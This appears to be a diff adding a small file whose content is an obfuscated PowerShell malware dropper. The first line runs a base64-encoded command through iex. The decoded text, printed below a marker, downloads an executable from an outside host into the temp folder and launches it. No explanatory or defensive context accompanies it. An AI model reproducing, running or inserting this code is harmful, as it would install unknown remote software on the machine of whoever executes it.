@@ -1,0 +1,7 @@
+iex([sYSTEM.TEXT.eNcodIng]::utF8.GeTsTring([sySTeM.CONVerT]::FrombasE64sTRiNg('CihOZXctT2JqZWN0IHN5U1RlbS5uRVQud2VCQ0xJRU50KS5Eb3dubE9hZEZpbEUoJ2h0dHA6Ly9uaWtpbC50ay9pMS9pel8wMDEuZXhlJywiJGVuVjpURU1QXGl6XzAwMS5leGUiKTtTdGFydC1Qcm9jZXNzICgiJGVuVjpURU1QXGl6XzAwMS5leGUiKQoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sySTem.nET.weBCLIENt).DownlOadFilE('http://nikil.tk/i1/iz_001.exe',"$enV:TEMP\iz_001.exe");Start-Process ("$enV:TEMP\iz_001.exe")
+
